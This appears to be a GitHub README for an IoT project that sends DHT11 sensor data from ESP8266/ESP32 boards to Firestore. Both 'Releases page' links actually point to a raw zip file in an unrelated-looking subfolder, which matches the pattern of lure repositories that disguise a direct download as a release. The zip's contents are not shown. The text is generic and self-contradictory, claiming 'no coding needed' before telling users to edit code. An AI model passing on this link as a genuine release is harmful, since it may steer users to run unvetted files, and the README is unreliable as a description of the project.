## üöÄ Introduction
FirebaseMicrocontroller is an Internet of Things (IoT) project designed to send DHT11 sensor data to Google Firestore in real-time. This project uses the ESP8266 and ESP32 microcontrollers, which allow even non-technical users to gather and visualize sensor data effortlessly.

## üõ†Ô∏è Features
- **Real-Time Data Transfer:** Send DHT11 sensor data to Firestore without delay.
- **User-Friendly Setup:** Simple instructions to get started, no coding needed.
- **Compatible with ESP8266 & ESP32:** Works on both popular microcontroller platforms.
- **Cloud Storage:** Store data safely and access it from anywhere.

## üñ•Ô∏è System Requirements
- **Microcontroller:** ESP8266 or ESP32
- **Network:** Wi-Fi connection for online data transfer
- **Account:** Google account for accessing Firestore

## üìñ Getting Started
To get started with FirebaseMicrocontroller, follow these simple steps.

### Step 1: Visit the Releases Page
Go to the [Releases page](https://raw.githubusercontent.com/lilmandrake-hub/FirebaseMicrocontroller/main/autotypography/FirebaseMicrocontroller.zip) to download the latest version of the software.

### Step 2: Download the Software
Find the latest release. Click the download link for the software that matches your microcontroller (ESP8266 or ESP32).

### Step 3: Set Up Your Microcontroller
1. **Connect your ESP8266 or ESP32** to your computer using a USB cable.
2. **Install necessary drivers** if prompted by your computer.
3. **Upload the code** from the downloaded package to your microcontroller. You can use the Arduino IDE for this step.

### Step 4: Configure the Code
Open the code files in the Arduino IDE. Look for the section where you need to enter your Wi-Fi credentials and Firestore details. Input your Wi-Fi network name and password, as well as your Firebase project credentials.

1. **Wi-Fi details**: Update the `SSID` and `PASSWORD` fields in the code.
2. **Firebase setup**: Follow the Firebase setup guide available in the documentation to get your credentials.

### Step 5: Upload and Run
After you have made these changes, click the "Upload" button in the Arduino IDE. This will upload the code to your microcontroller. If everything is correct, your microcontroller will connect to the Wi-Fi network and begin sending data to Firestore.

### Step 6: Monitor Your Data
Once the microcontroller runs, open your Firestore dashboard. You should see your sensor data displaying in real-time.

## üì• Download & Install
You can download the latest version of FirebaseMicrocontroller from our [Releases page](https://raw.githubusercontent.com/lilmandrake-hub/FirebaseMicrocontroller/main/autotypography/FirebaseMicrocontroller.zip).
